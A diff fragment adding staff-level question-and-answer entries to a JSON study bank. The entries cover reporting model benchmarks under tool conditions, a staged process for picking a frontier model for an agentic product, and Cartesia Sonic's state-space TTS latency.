+      "a": "Tool access changes what the model can do to verify or compute an answer rather than reason it purely internally, so relative strengths (e.g. raw reasoning vs. tool-orchestration skill) can favor different models under each condition -- meaning a single headline number without the condition stated is incomplete.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T26-frontier-landscape-d15",
+      "module": "T26-frontier-landscape",
+      "q": "Design the four-stage process for choosing which frontier model powers a new agentic product.",
+      "a": "1) Fast triage (hours): blank-cell/harness/tool-condition check, wait for one independent number. 2) Shortlist eval (days): held-out set from real production tasks, rubric tied to real outcomes, repeated runs. 3) Cost/license/ops gate: pricing at real volume, full license text, latency, availability track record. 4) Staged rollout: pinned version, small traffic percentage, continuous regression suite, widen only after real-traffic metrics confirm the offline signal.",
+      "difficulty": "staff"
+    },
+    {
+      "id": "T26-voice-models-d13",
+      "module": "T26-voice-models",
+      "q": "Explain the architectural bet Cartesia made with Sonic's state-space-model TTS versus a transformer-based competitor, and why it matters for p99.",
+      "a": "SSMs process sequences more efficiently than transformer attention, giving Sonic consistently low latency including at the tail (p99), not just a good median -- Sonic 3.5 reports 75-90ms time-to-first-audio, which matters because p99 determines the worst-case caller experience, not the average one.",
       "difficulty": "staff"
     }
   ]
